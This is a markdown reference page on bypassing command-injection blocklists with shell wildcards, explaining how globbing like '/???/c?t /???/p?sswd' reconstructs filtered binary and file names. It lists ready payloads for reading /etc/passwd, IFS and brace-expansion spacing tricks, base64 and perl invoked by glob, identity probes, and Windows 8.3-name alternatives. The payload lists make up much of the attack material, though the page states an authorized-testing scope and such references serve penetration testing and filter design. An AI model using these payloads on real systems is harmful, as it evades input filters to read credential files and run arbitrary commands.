---
title: "Command injection filter bypass with wildcards and globbing"
description: "Reconstructing filtered binary names and paths with shell glob characters—/???/c?t /???/p?sswd, /bin/c*—so the blocked literal never appears in the request; includes Windows wildcard behavior."
keywords:
  - command injection
  - wildcard
  - globbing
  - filter bypass
  - path reconstruction
  - WAF evasion
---

# Wildcards

Shell globbing expands pattern characters—`?` (any single character), `*` (any run of characters), and `[...]` (a character class)—into matching filesystem paths **before** the command runs. This lets an attacker name a binary or a target file without typing its literal name: `/???/c?t /???/p?sswd` expands to `/bin/cat /etc/passwd`, yet the request contains neither `cat`, `passwd`, nor `/bin/`. A blocklist matching those literals never fires.

> **Scope.** For authorized penetration tests, red-team engagements, and CTF labs against systems you are contracted to assess. Executing commands without written authorization is unlawful.

## Why the shell normalizes it away

The shell performs **pathname expansion** on any unquoted word containing `?`, `*`, or `[`: it searches the matching directories and replaces the pattern with the real paths that exist. `/???/c?t` matches `/bin/cat` (three-character directory, `c`-any-`t` filename). Because the substitution happens inside the shell after the filter has inspected the input, the request carries only wildcard characters and partial fragments. The blocklist sees `/???/c?t`; the kernel executes `/bin/cat`. The forbidden substring is assembled from the filesystem, not from the payload.

## Payloads (POSIX)

Read `/etc/passwd` when `cat`, `passwd`, or spaces-plus-name are filtered:

```
/???/c?t /???/p?sswd
/bin/c?t /etc/p?sswd
/???/??t /???/p??swd
/bin/c*t /e??/*sswd
```

Run identity probes without the literal binary name:

```
/???/wh??mi
/bin/wh*
/usr/bin/i?
```

`/???/` matches any three-letter top-level directory, which on Linux resolves to `/bin` (and often `/sbin`, `/lib`—narrow the following pattern to disambiguate). Combine with a no-space technique since globs still need separators between arguments:

```
/???/c?t${IFS}/???/p?sswd
{/???/c?t,/???/p?sswd}
```

A particularly compact primitive abuses `/bin/*` directories that contain tools with predictable names—for example invoking `tar`, `nc`, or an interpreter by pattern when its literal name is blocked:

```
/???/b??e64 /???/p?sswd        # base64 /etc/passwd
/usr/bin/p?rl -e '...'          # perl by glob
```

Globbing also helps when only the *argument* is filtered: expanding a directory listing feeds filenames into a flag without naming them (`tar -cf /dev/stdout *` to read files via GTFOBins-style primitives).

## Windows wildcard behavior

`cmd.exe` and PowerShell do **not** glob the way POSIX shells do. The command processor does not expand `?`/`*` into argument lists; each program performs its own wildcard matching on paths it receives. Consequences for payloads:

- `type C:\???\*` does not expand in `cmd.exe`—`type` resolves wildcards itself, and only for file arguments it supports.
- Short filename (8.3) aliases are the closer analogue: `C:\PROGRA~1` references `Program Files` without the space or full name.
- PowerShell `Get-ChildItem` and cmdlets accept `*`/`?` as their own parameters, but the shell will not reconstruct an executable *name* from a glob the way `/???/c?t` does on Linux.

Treat wildcard reconstruction of a binary name as a POSIX technique; on Windows, rely on 8.3 names, case tricks, or environment-variable assembly instead.

## References

- [PayloadsAllTheThings: Command Injection — Bypass without specific characters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [GTFOBins](https://gtfobins.github.io/)
- [Bash Reference Manual: Filename Expansion](https://www.gnu.org/software/bash/manual/html_node/Filename-Expansion.html)
